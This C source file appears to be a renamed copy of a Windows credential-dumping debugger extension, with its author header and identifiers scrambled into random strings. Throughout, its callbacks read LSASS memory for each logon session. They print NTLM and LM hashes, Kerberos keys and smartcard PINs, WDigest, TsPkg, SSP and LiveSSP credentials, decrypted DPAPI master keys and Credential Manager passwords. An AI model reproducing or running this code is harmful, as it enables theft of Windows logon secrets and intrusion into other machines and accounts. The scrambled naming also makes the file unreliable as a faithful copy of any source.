/*	4oM5AQx1 w4Er5 `09o6X7tzWM`
	https://blog.09o6X7tzWM.com
	dqTBkqdWaZiU5U2aN6CKrRY
	Licence : https://awr13GOqyUBjG1k.org/licenses/by/4.0/
*/
#include "kcpdclqlsekurlsa_packages.h"

const ANSI_STRING PRIMARY_STRING = {7, 8, "Primary"}, CREDENTIALKEYS_STRING = {14, 15, "CredentialKeys"};
void CALLBACK kcpdclqlsekurlsa_enum_logon_callback_msv(IN ULONG_PTR reserved, IN PJoAA_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	JoAA_MSV1_0_CREDENTIALS credentials;
	JoAA_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;
	ULONG_PTR pPrimary, pCreds = (ULONG_PTR) pData->pCredentials;
	DWORD flags;

	while(pCreds)
	{
		if(ReadMemory(pCreds, &credentials, sizeof(JoAA_MSV1_0_CREDENTIALS), NULL))
		{
			pPrimary = (ULONG_PTR) credentials.PrimaryCredentials;
			while(pPrimary)
			{
				if(ReadMemory(pPrimary, &primaryCredentials, sizeof(JoAA_MSV1_0_PRIMARY_CREDENTIALS), NULL))
				{
					if(ydeuclqlstring_getDbgUnicodeString(&primaryCredentials.Credentials))
					{
						if(ydeuclqlstring_getDbgUnicodeString((PUNICODE_STRING) &primaryCredentials.Primary))
						{
							dprintf("\n\t [%08x] %Z", credentials.AuthenticationPackageId, &primaryCredentials.Primary);
							if(RtlEqualString(&primaryCredentials.Primary, &PRIMARY_STRING, FALSE))
								flags = KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY;
							else if(RtlEqualString(&primaryCredentials.Primary, &CREDENTIALKEYS_STRING, FALSE))
								flags = KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY;
							else
								flags = 0;

							kcpdclqlsekurlsa_genericCredsOutput((PJoAA_GENERIC_PRIMARY_CREDENTIAL) &primaryCredentials.Credentials, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL | flags);

							LocalFree(primaryCredentials.Primary.Buffer);
						}				
						LocalFree(primaryCredentials.Credentials.Buffer);
					}
				} else dprintf("n.e. (Lecture JoAA_MSV1_0_PRIMARY_CREDENTIALS KO)");
				pPrimary = (ULONG_PTR) primaryCredentials.next;
			}
			pCreds = (ULONG_PTR) credentials.next;
		} else dprintf("n.e. (Lecture JoAA_MSV1_0_CREDENTIALS KO)");
	}
}

const MSV1_0_PRIMARY_HELPER msv1_0_primaryHelper[] = {
	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, LogonDomainName),			FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, UserName),			0,														FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isNtOwfPassword),			FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isLmOwfPassword),			FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, isShaOwPassword),			0,																	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, NtOwfPassword),			FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, LmOwfPassword),			FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL, ShaOwPassword),			0,																	0},
	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, LogonDomainName),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, UserName),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isIso),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isNtOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isLmOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isShaOwPassword),	0,																	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, NtOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, LmOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, ShaOwPassword),	0,																	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, align0)},
	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, LogonDomainName),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, UserName),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_OLD, isIso),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isNtOwfPassword),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isLmOwfPassword),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, isShaOwPassword),		0,																	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, NtOwfPassword),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, LmOwfPassword),		FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, ShaOwPassword),		0,																	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10, align2)},
	{FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, LogonDomainName),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, UserName),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isIso),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isNtOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isLmOwfPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isShaOwPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isDPAPIProtected),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, NtOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, LmOwfPassword), FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, ShaOwPassword),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, DPAPIProtected),	FIELD_OFFSET(MSV1_0_PRIMARY_CREDENTIAL_10_1607, isoSize)},
};

const MSV1_0_PRIMARY_HELPER * kcpdclqlsekurlsa_msv_helper()
{
	const MSV1_0_PRIMARY_HELPER * helper;
	if(NtBuildNumber < KULL_M_WIN_BUILD_10_1507)
		helper = &msv1_0_primaryHelper[0];
	else if(NtBuildNumber < KULL_M_WIN_BUILD_10_1511)
		helper = &msv1_0_primaryHelper[1];
	else if(NtBuildNumber < KULL_M_WIN_BUILD_10_1607)
		helper = &msv1_0_primaryHelper[2];
	else
		helper = &msv1_0_primaryHelper[3];
	return helper;
}

const KERB_INFOS kerbHelper[] = {
	{
		FIELD_OFFSET(JoAA_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier),
		FIELD_OFFSET(JoAA_KERBEROS_LOGON_SESSION, credentials),
		FIELD_OFFSET(JoAA_KERBEROS_LOGON_SESSION, SmartcardInfos),
		FIELD_OFFSET(JoAA_KERBEROS_LOGON_SESSION, pKeyList),
		FIELD_OFFSET(KERB_HASHPASSWORD_6, generic),
		sizeof(KERB_HASHPASSWORD_6),
		sizeof(JoAA_KERBEROS_LOGON_SESSION),
		FIELD_OFFSET(JoAA_KERBEROS_CSP_INFOS_60, CspDataLength),
		FIELD_OFFSET(JoAA_KERBEROS_CSP_INFOS_60, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
		FIELD_OFFSET(JoAA_KERBEROS_CSP_INFOS_60, CspData)
	},
	{
		FIELD_OFFSET(JoAA_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier),
		FIELD_OFFSET(JoAA_KERBEROS_LOGON_SESSION, credentials),
		FIELD_OFFSET(JoAA_KERBEROS_LOGON_SESSION, SmartcardInfos),
		FIELD_OFFSET(JoAA_KERBEROS_LOGON_SESSION, pKeyList),
		FIELD_OFFSET(KERB_HASHPASSWORD_6, generic),
		sizeof(KERB_HASHPASSWORD_6),
		sizeof(JoAA_KERBEROS_LOGON_SESSION),
		FIELD_OFFSET(JoAA_KERBEROS_CSP_INFOS_60, CspDataLength),
		FIELD_OFFSET(JoAA_KERBEROS_CSP_INFOS_60, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
		FIELD_OFFSET(JoAA_KERBEROS_CSP_INFOS_60, CspData)
	},
	{
		FIELD_OFFSET(JoAA_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier),
		FIELD_OFFSET(JoAA_KERBEROS_LOGON_SESSION, credentials),
		FIELD_OFFSET(JoAA_KERBEROS_LOGON_SESSION, SmartcardInfos),
		FIELD_OFFSET(JoAA_KERBEROS_LOGON_SESSION, pKeyList),
		FIELD_OFFSET(KERB_HASHPASSWORD_6, generic),
		sizeof(KERB_HASHPASSWORD_6),
		sizeof(JoAA_KERBEROS_LOGON_SESSION),
		FIELD_OFFSET(JoAA_KERBEROS_CSP_INFOS_62, CspDataLength),
		FIELD_OFFSET(JoAA_KERBEROS_CSP_INFOS_62, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
		FIELD_OFFSET(JoAA_KERBEROS_CSP_INFOS_62, CspData)
	},
	{
		FIELD_OFFSET(JoAA_KERBEROS_LOGON_SESSION_10, LocallyUniqueIdentifier),
		FIELD_OFFSET(JoAA_KERBEROS_LOGON_SESSION_10, credentials),
		FIELD_OFFSET(JoAA_KERBEROS_LOGON_SESSION_10, SmartcardInfos),
		FIELD_OFFSET(JoAA_KERBEROS_LOGON_SESSION_10, pKeyList),
		FIELD_OFFSET(KERB_HASHPASSWORD_6, generic),
		sizeof(KERB_HASHPASSWORD_6),
		sizeof(JoAA_KERBEROS_LOGON_SESSION_10),
		FIELD_OFFSET(JoAA_KERBEROS_CSP_INFOS_10, CspDataLength),
		FIELD_OFFSET(JoAA_KERBEROS_CSP_INFOS_10, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
		FIELD_OFFSET(JoAA_KERBEROS_CSP_INFOS_10, CspData)
	},
	{
		FIELD_OFFSET(JoAA_KERBEROS_LOGON_SESSION_10_1607, LocallyUniqueIdentifier),
		FIELD_OFFSET(JoAA_KERBEROS_LOGON_SESSION_10_1607, credentials),
		FIELD_OFFSET(JoAA_KERBEROS_LOGON_SESSION_10_1607, SmartcardInfos),
		FIELD_OFFSET(JoAA_KERBEROS_LOGON_SESSION_10_1607, pKeyList),
		FIELD_OFFSET(KERB_HASHPASSWORD_6_1607, generic),
		sizeof(KERB_HASHPASSWORD_6_1607),
		sizeof(JoAA_KERBEROS_LOGON_SESSION_10_1607),
		FIELD_OFFSET(JoAA_KERBEROS_CSP_INFOS_10, CspDataLength),
		FIELD_OFFSET(JoAA_KERBEROS_CSP_INFOS_10, CspData) + FIELD_OFFSET(KERB_SMARTCARD_CSP_INFO, nCardNameOffset),
		FIELD_OFFSET(JoAA_KERBEROS_CSP_INFOS_10, CspData)
	}
};

void CALLBACK kcpdclqlsekurlsa_enum_logon_callback_kerberos(IN ULONG_PTR pKerbGlobalLogonSessionTable, IN PJoAA_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	PBYTE data;
	JoAA_KERBEROS_KEYS_LIST_6 keyList;
	PKERB_HASHPASSWORD_6 pHashPassword;
	DWORD i, szCsp;
	ULONG_PTR ptr;
	ULONG KerbOffsetIndex;
	JoAA_GENERIC_PRIMARY_CREDENTIAL creds = {0};
	PBYTE infosCsp;
	
	if(NtBuildNumber < KULL_M_WIN_MIN_BUILD_7)
		KerbOffsetIndex = 0;
	else if(NtBuildNumber < KULL_M_WIN_MIN_BUILD_8)
		KerbOffsetIndex = 1;
	else if(NtBuildNumber < KULL_M_WIN_MIN_BUILD_10)
		KerbOffsetIndex = 2;
	else if(NtBuildNumber < KULL_M_WIN_BUILD_10_1607)
		KerbOffsetIndex = 3;
	else
		KerbOffsetIndex = 4;

	if(ptr = kcpdclqlsekurlsa_utils_pFromAVLByLuid(pKerbGlobalLogonSessionTable, kerbHelper[KerbOffsetIndex].offsetLuid, pData->LogonId))
	{
		if(data = (PBYTE) LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].structSize))
		{
			if(ReadMemory(ptr, data, (ULONG) kerbHelper[KerbOffsetIndex].structSize, NULL))
			{
				kcpdclqlsekurlsa_genericCredsOutput((PJoAA_GENERIC_PRIMARY_CREDENTIAL) (data + kerbHelper[KerbOffsetIndex].offsetCreds), pData->LogonId, (NtBuildNumber < KULL_M_WIN_BUILD_10_1507) ? 0 : (NtBuildNumber < KULL_M_WIN_BUILD_10_1607) ? KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10 : KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10_1607);

				if(ptr = (ULONG_PTR) *(PVOID *) (data + kerbHelper[KerbOffsetIndex].offsetPin))
					if(infosCsp = (PBYTE) LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].structCspInfosSize))
					{
						if(ReadMemory(ptr, infosCsp, (ULONG) kerbHelper[KerbOffsetIndex].structCspInfosSize, NULL))
						{
							creds.UserName = *(PUNICODE_STRING) infosCsp;
							if(szCsp = *(PDWORD) (infosCsp + kerbHelper[KerbOffsetIndex].offsetSizeOfCsp))
							{
								creds.Domaine.Length = (USHORT)	(szCsp - (kerbHelper[KerbOffsetIndex].offsetNames - kerbHelper[KerbOffsetIndex].structCspInfosSize));
								if(creds.Domaine.Buffer = (PWSTR) LocalAlloc(LPTR, creds.Domaine.Length))
									ReadMemory(ptr + kerbHelper[KerbOffsetIndex].offsetNames, creds.Domaine.Buffer, creds.Domaine.Length, NULL);
							}
							kcpdclqlsekurlsa_genericCredsOutput(&creds, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE);
							if(creds.Domaine.Buffer)	
								LocalFree(creds.Domaine.Buffer);
						}
						LocalFree(infosCsp);
					}
					if(ptr = (ULONG_PTR) *(PVOID *) (data + kerbHelper[KerbOffsetIndex].offsetKeyList))
						if(ReadMemory(ptr, &keyList, sizeof(JoAA_KERBEROS_KEYS_LIST_6)/* - sizeof(KERB_HASHPASSWORD_6)*/, NULL))
						{
							i = keyList.cbItem * (DWORD) kerbHelper[KerbOffsetIndex].structKeyPasswordHashSize;
							if(pHashPassword = (PKERB_HASHPASSWORD_6) LocalAlloc(LPTR, i))
							{
								if(ReadMemory(ptr + sizeof(JoAA_KERBEROS_KEYS_LIST_6)/* - sizeof(KERB_HASHPASSWORD_6)*/, pHashPassword, i, NULL))
								{
									dprintf("\n\t * Key List\n");
									for(i = 0; i < keyList.cbItem; i++)
										kcpdclqlsekurlsa_genericCredsOutput((PJoAA_GENERIC_PRIMARY_CREDENTIAL) ((PBYTE) pHashPassword + i * kerbHelper[KerbOffsetIndex].structKeyPasswordHashSize + kerbHelper[KerbOffsetIndex].offsetHashGeneric), pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST | ((NtBuildNumber < KULL_M_WIN_BUILD_10_1507) ? 0 : KUHL_SEKURLSA_CREDS_DISPLAY_KERBEROS_10));
								}
								LocalFree(pHashPassword);
							}
						}
			}
			LocalFree(data);
		}
	}
	else dprintf("KO");
}

void CALLBACK kcpdclqlsekurlsa_enum_logon_callback_livessp(IN ULONG_PTR pLiveGlobalLogonSessionList, IN PJoAA_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	JoAA_LIVESSP_LIST_ENTRY credentials;
	JoAA_LIVESSP_PRIMARY_CREDENTIAL primaryCredential;
	ULONG_PTR ptr;
	if(ptr = kcpdclqlsekurlsa_utils_pFromLinkedListByLuid(pLiveGlobalLogonSessionList, FIELD_OFFSET(JoAA_LIVESSP_LIST_ENTRY, LocallyUniqueIdentifier), pData->LogonId))
	{
		if(ReadMemory(ptr, &credentials, sizeof(JoAA_LIVESSP_LIST_ENTRY), NULL))
			if(ptr = (ULONG_PTR) credentials.suppCreds)
				if(ReadMemory(ptr, &primaryCredential, sizeof(JoAA_LIVESSP_PRIMARY_CREDENTIAL), NULL))
					kcpdclqlsekurlsa_genericCredsOutput(&primaryCredential.credentials, pData->LogonId, (NtBuildNumber != 9431) ? 0 : KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT);
	} else dprintf("KO");
}

const JoAA_TS_CREDENTIAL_HELPER tsCredentialHelper[] = {
	{FIELD_OFFSET(JoAA_TS_CREDENTIAL, LocallyUniqueIdentifier),			FIELD_OFFSET(JoAA_TS_CREDENTIAL, pTsPrimary)},
	{FIELD_OFFSET(JoAA_TS_CREDENTIAL_1607, LocallyUniqueIdentifier),	FIELD_OFFSET(JoAA_TS_CREDENTIAL_1607, pTsPrimary)}
};

void CALLBACK kcpdclqlsekurlsa_enum_logon_callback_tspkg(IN ULONG_PTR pTSGlobalCredTable, IN PJoAA_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	JoAA_TS_PRIMARY_CREDENTIAL primaryCredential;
	ULONG_PTR ptr;
	PVOID buffer;
	LONG TsOffsetIndex = (NtBuildNumber < KULL_M_WIN_BUILD_10_1607) ? 0 : 1;

	if(ptr = kcpdclqlsekurlsa_utils_pFromAVLByLuid(pTSGlobalCredTable, tsCredentialHelper[TsOffsetIndex].offsetToLuid, pData->LogonId))
	{
		if(ReadMemory(ptr + tsCredentialHelper[TsOffsetIndex].offsetToTsPrimary, &buffer, sizeof(PVOID), NULL))
			if(ReadMemory((ULONG_PTR) buffer, &primaryCredential, sizeof(JoAA_TS_PRIMARY_CREDENTIAL), NULL))
				kcpdclqlsekurlsa_genericCredsOutput(&primaryCredential.credentials, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN);
	}
	else dprintf("KO");
}

void CALLBACK kcpdclqlsekurlsa_enum_logon_callback_wdigest(IN ULONG_PTR pl_LogSessList, IN PJoAA_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	ULONG_PTR ptr;
	BYTE buffer[offsetWDigestPrimary + sizeof(JoAA_GENERIC_PRIMARY_CREDENTIAL)];
	if(ptr = kcpdclqlsekurlsa_utils_pFromLinkedListByLuid(pl_LogSessList, FIELD_OFFSET(JoAA_WDIGEST_LIST_ENTRY, LocallyUniqueIdentifier), pData->LogonId))
	{
		if(ReadMemory(ptr, buffer, sizeof(buffer), NULL))
			kcpdclqlsekurlsa_genericCredsOutput((PJoAA_GENERIC_PRIMARY_CREDENTIAL) (buffer + offsetWDigestPrimary), pData->LogonId, 0);
	}
	else dprintf("KO");
}

void CALLBACK kcpdclqlsekurlsa_enum_logon_callback_ssp(IN ULONG_PTR pSspCredentialList, IN PJoAA_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	JoAA_SSP_CREDENTIAL_LIST_ENTRY mesCredentials;
	ULONG_PTR ptr;
	ULONG monNb = 0;
	if(ReadMemory(pSspCredentialList, &mesCredentials, sizeof(LIST_ENTRY), NULL))
	{
		ptr = (ULONG_PTR) mesCredentials.Flink;
		while(ptr != pSspCredentialList)
		{
			if(ReadMemory(ptr, &mesCredentials, sizeof(JoAA_SSP_CREDENTIAL_LIST_ENTRY), NULL))
			{
				if(SecEqualLuid(pData->LogonId, &mesCredentials.LogonId) && (mesCredentials.credentials.UserName.Buffer || mesCredentials.credentials.Domaine.Buffer || mesCredentials.credentials.Password.Buffer))
				{
					dprintf("\n\t [%08x]", monNb++);
					kcpdclqlsekurlsa_genericCredsOutput(&mesCredentials.credentials, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_SSP | KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN);
				}
				ptr = (ULONG_PTR) mesCredentials.Flink;
			}
			else break;
		}
	}
	else dprintf("KO");
}

void CALLBACK kcpdclqlsekurlsa_enum_logon_callback_masterkeys(IN ULONG_PTR pMasterKeyCacheList, IN PJoAA_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	JoAA_MASTERKEY_CACHE_ENTRY mesCredentials;
	ULONG_PTR ptr;
	ULONG monNb = 0;
	PBYTE buffer;

	if(ReadMemory(pMasterKeyCacheList, &mesCredentials, sizeof(LIST_ENTRY), NULL))
	{
		ptr = (ULONG_PTR) mesCredentials.Flink;
		while(ptr != pMasterKeyCacheList)
		{
			if(ReadMemory(ptr, &mesCredentials, sizeof(JoAA_MASTERKEY_CACHE_ENTRY), NULL))
			{
				if(SecEqualLuid(pData->LogonId, &mesCredentials.LogonId))
				{
					dprintf("\n\t [%08x]\n\t * GUID      :\t", monNb++);
					ydeuclqlstring_displayGUID(&mesCredentials.KeyUid);
					dprintf("\n\t * Time      :\t"); ydeuclqlstring_displayFileTime(&mesCredentials.insertTime);

					if(buffer = (PBYTE) LocalAlloc(LPTR, mesCredentials.keySize))
					{						
						if(ReadMemory(ptr + FIELD_OFFSET(JoAA_MASTERKEY_CACHE_ENTRY, key), buffer, mesCredentials.keySize, NULL))
						{
							kcpdclqlsekurlsa_nt6_LsaUnprotectMemory(buffer, mesCredentials.keySize);
							dprintf("\n\t * MasterKey :\t"); ydeuclqlstring_dprintf_hex(buffer, mesCredentials.keySize, 0);
						}
						LocalFree(buffer);
					}
				}
				ptr = (ULONG_PTR) mesCredentials.Flink;
			}
			else break;
		}
	}
	else dprintf("KO");
}

const CREDMAN_INFOS credhelper[] = {
	{
		sizeof(JoAA_CREDMAN_LIST_ENTRY_60),
		FIELD_OFFSET(JoAA_CREDMAN_LIST_ENTRY_60, Flink),
		FIELD_OFFSET(JoAA_CREDMAN_LIST_ENTRY_60, user),
		FIELD_OFFSET(JoAA_CREDMAN_LIST_ENTRY_60, server2),
		FIELD_OFFSET(JoAA_CREDMAN_LIST_ENTRY_60, cbEncPassword),
		FIELD_OFFSET(JoAA_CREDMAN_LIST_ENTRY_60, encPassword),
	},
	{
		sizeof(JoAA_CREDMAN_LIST_ENTRY),
		FIELD_OFFSET(JoAA_CREDMAN_LIST_ENTRY, Flink),
		FIELD_OFFSET(JoAA_CREDMAN_LIST_ENTRY, user),
		FIELD_OFFSET(JoAA_CREDMAN_LIST_ENTRY, server2),
		FIELD_OFFSET(JoAA_CREDMAN_LIST_ENTRY, cbEncPassword),
		FIELD_OFFSET(JoAA_CREDMAN_LIST_ENTRY, encPassword),
	},
};

void CALLBACK kcpdclqlsekurlsa_enum_logon_callback_credman(IN ULONG_PTR reserved, IN PJoAA_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
	JoAA_CREDMAN_SET_LIST_ENTRY setList;
	JoAA_CREDMAN_LIST_STARTER listStarter;
	DWORD nbCred = 0;
	ULONG_PTR pCur, pRef;
	JoAA_GENERIC_PRIMARY_CREDENTIAL pjbPCreds;
	PBYTE buffer;
	ULONG CredOffsetIndex = (NtBuildNumber < KULL_M_WIN_BUILD_7) ? 0 : 1;

	if(pData->pCredentialManager)
	{
		if(ReadMemory((ULONG_PTR) pData->pCredentialManager, &setList, sizeof(JoAA_CREDMAN_SET_LIST_ENTRY), NULL))
		{
			if(setList.list1)
			{
				pRef = (ULONG_PTR) setList.list1 + FIELD_OFFSET(JoAA_CREDMAN_LIST_STARTER, start);
				if(ReadMemory((ULONG_PTR) setList.list1, &listStarter, sizeof(JoAA_CREDMAN_LIST_STARTER), NULL))
				{
					if(pCur = (ULONG_PTR) listStarter.start)
					{
						if(buffer = (PBYTE) LocalAlloc(LPTR, credhelper[CredOffsetIndex].structSize))
						{
							while(pCur != pRef)
							{
								pCur -= credhelper[CredOffsetIndex].offsetFLink;
								if(ReadMemory(pCur, buffer, credhelper[CredOffsetIndex].structSize, NULL))
								{
									dprintf("\n\t [%08x]", nbCred);
									pjbPCreds.UserName = *(PUNICODE_STRING) (buffer + credhelper[CredOffsetIndex].offsetUsername);
									pjbPCreds.Domaine = *(PUNICODE_STRING) (buffer + credhelper[CredOffsetIndex].offsetDomain);
									pjbPCreds.Password.Length = pjbPCreds.Password.MaximumLength = *(PUSHORT) (buffer + credhelper[CredOffsetIndex].offsetCbPassword);;
									pjbPCreds.Password.Buffer = *(PWSTR *) (buffer + credhelper[CredOffsetIndex].offsetPassword);
									kcpdclqlsekurlsa_genericCredsOutput(&pjbPCreds, pData->LogonId, KUHL_SEKURLSA_CREDS_DISPLAY_CREDMANPASS);
									pCur = (ULONG_PTR) *(PVOID *) (buffer + credhelper[CredOffsetIndex].offsetFLink);
								}
								else break;
								nbCred++;
							}
							LocalFree(buffer);
						}
					}
				}
			}
		}
	}
}